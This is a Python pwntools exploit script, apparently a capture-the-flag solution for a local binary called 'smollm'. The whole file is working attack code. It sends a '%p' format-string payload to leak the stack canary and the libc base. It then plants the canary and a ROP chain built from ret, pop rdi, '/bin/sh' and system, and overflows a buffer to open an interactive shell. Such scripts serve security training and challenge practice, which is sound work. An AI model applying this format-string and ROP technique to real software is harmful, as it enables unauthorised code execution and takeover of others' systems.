#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './smollm')
libc = ELF(exe.libc.path)

n_tokens   = 0x6a
combinator = 0x0

def calc_input(idx):
    global combinator, n_tokens
    payload = (idx - combinator) % n_tokens
    combinator += 1
    return bytes([payload])

def add_token(token):
    global n_tokens
    io.sendlineafter(b">", b"1")
    io.sendafter(b"?>", token)
    n_tokens = n_tokens + 1

io = process(exe.path)

add_token(b"%p"*6 + b"\x00")

payload = b""
for i in range(25): payload += calc_input(n_tokens-1)

io.sendlineafter(b'>', b'2')
io.sendlineafter(b'>', payload)

io.recvline()
leak = io.recvline().strip().replace(b"(nil)", b"").decode().split('>')[1].split('0x')[35:]

canary       = int(leak[1], 16)
libc.address = int(leak[10], 16) - 0x2a1ca

add_token(p64(canary))

rop = ROP(libc)
add_token(p64(rop.find_gadget(['ret'])[0]))
add_token(p64(rop.find_gadget(['pop rdi', 'ret'])[0]))
add_token(p64(next(libc.search(b"/bin/sh\x00"))))
add_token(p64(libc.symbols['system']))

combinator += 1 + 33
io.sendlineafter(b'>', b'2')
io.sendlineafter(b'>', b"A"*33 + calc_input(n_tokens - 5) + calc_input(n_tokens - 1) + calc_input(n_tokens - 4) + calc_input(n_tokens - 3) + calc_input(n_tokens - 2) + calc_input(n_tokens - 1))

io.clean()
io.interactive()

